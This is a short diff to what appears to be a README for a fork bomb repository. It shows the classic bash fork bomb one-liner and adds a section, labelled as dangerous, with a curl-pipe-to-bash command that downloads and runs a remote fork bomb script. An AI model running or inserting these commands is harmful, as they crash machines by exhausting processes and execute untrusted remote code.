@@ -18,3 +18,8 @@ Here is the command as follows:
 ```
 :(){ :|: &};:
 ```
+
+## A dangerous way of running this command
+```
+$ curl "https://cdn.rawgit.com/nabilfadjar/forkBomb/master/forkBomb.sh" | bash
+```
